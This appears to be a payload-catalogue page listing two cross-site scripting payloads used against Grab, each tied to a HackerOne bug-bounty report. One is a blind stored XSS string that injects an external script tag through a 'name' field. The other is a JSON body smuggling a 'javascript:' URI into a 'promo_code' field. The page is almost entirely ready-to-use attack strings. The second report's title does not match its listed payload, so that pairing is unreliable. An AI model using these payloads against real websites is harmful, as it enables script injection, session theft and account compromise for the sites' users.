# Grab

2 payloads.

### `ba7dbc0f`

```
"><script src=https://target.com></script>
```

**Parameter:** `name`
— [Blind stored xss \[target.com\] > name parameter ](https://hackerone.com/reports/251224) · Grab · [paresh_parmar](https://hackerone.com/paresh_parmar) · $750.0

### `0f2b4377`

```
{"name": "Test HackerOne", "start_date": "01.01.2018", "leanplum_id": "test", "rides": "200", "places": "20", "distance": 500, "cancel_times": "0", "days": "100", "promo_code": "javascript://target.com/test%0aalert(document.domain)", "prf_reward": "10"}
```

**Parameter:** `promo_code`
— [\[target.com\] Reflected XSS via Base64-encoded "q" param on "my.html" Valentine's microsite](https://hackerone.com/reports/320679) · Grab · [ysx](https://hackerone.com/ysx)
